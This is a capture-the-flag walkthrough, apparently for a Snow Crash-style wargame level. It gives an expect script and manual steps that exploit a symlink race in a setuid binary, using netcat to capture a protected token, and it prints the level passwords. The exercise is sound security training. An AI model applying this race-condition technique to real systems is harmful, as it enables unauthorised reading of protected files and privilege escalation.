# Level 10
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level10@$ip -p 4242 "mkdir -p /tmp/level10 ; cd /tmp/level10 ; rm -rf ./* ; chmod 777 . ; touch /tmp/level10/file ; killall -q -w nc ; nc -k -l 6969 > /tmp/level10/rec & for i in \`seq 1 1000\`\; do ln -fs /tmp/level10/file /tmp/level10/link; ln -fs /home/user/level10/token /tmp/level10/link; done & for i in \`seq 1 1000\`\; do /home/user/level10/level10 /tmp/level10/link 127.0.0.1 >> /tmp/level10/send; done ; cat /tmp/level10/rec | grep '\[a-z0-9\]' | head -1"
	expect "sword:"
	send "s5cAJpM8ev6XHw998pRWG728z\r"
	expect -re "\r\n(.*?)\r\n"
	set password $expect_out(1,string)
	spawn ssh -o "StrictHostKeyChecking no" flag10@$ip -p 4242 "getflag"
	expect "sword:"
	send "$password\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- Run the file `level10`
	```sh
	$ ./level10
	```
- Make `level10` directory in `/tmp` location
	```sh
	$ mkdir -p /tmp/level10
	$ rm -rf /tmp/level10/*
	$ chmod 777 /tmp/level10
	```
- Run the next commands to find the token
	```sh
	$ touch /tmp/level10/file
	$ killall -q -w nc
	$ nc -k -l 6969 > /tmp/level10/rec &
	$ for i in `seq 1 1000`; do ln -fs /tmp/level10/file /tmp/level10/link; ln -fs /home/user/level10/token /tmp/level10/link; done &
	$ for i in `seq 1 1000`; do /home/user/level10/level10 /tmp/level10/link 127.0.0.1 >> /tmp/level10/send; done
	$ more /tmp/level10/rec
	```
- Switch to the user `flag10` with the given token `woupa2yuojeeaaed06riuj63c`
	```sh
	$ su flag10
	Password: woupa2yuojeeaaed06riuj63c
	```
- Run `getflag` command to get the flag
	```sh
	$ getflag
	``` 
- With the token provided `feulo4b72j7edeahuete3no7c` switch to the next user level
	```sh
	$ su level11
	Password: feulo4b72j7edeahuete3no7c
	``` 
